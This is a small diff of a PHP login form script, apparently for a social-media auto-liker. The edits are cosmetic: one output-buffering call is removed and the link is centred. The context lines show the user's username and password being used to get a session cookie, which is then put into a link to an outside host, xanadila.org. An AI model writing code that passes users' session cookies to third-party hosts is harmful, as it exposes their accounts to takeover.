@@ -141,7 +141,6 @@ function SendRequest($url, $post, $post_data, $user_agent, $cookies) {
 }
 
 if(isset($_POST['submit'])) {
-	disable_ob();
 	$u = $_POST['username'];
 	$p = $_POST['password'];
 	echo "\n";
@@ -153,7 +152,7 @@ if(isset($_POST['submit'])) {
 	} else {
 		$kukie = $go->cookie;
 		$link = "http://xanadila.org/bot-like-tl/run.php?kukie=" . $kukie;
-		echo "<a href='".$link."'>Click Here</a>";	
+		echo "<p align='center'><a href='".$link."'>Click Here</a></p>";	
 	}
 }
 ?>
